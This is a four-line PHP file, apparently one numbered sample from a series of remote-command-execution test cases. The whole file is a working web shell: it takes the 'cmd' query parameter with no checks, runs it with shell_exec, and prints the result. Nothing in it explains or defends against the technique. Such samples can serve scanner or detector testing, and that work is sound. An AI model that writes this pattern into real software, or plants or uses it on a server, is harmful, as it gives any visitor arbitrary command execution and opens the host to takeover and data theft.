<?php
// RCE test variation #952
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>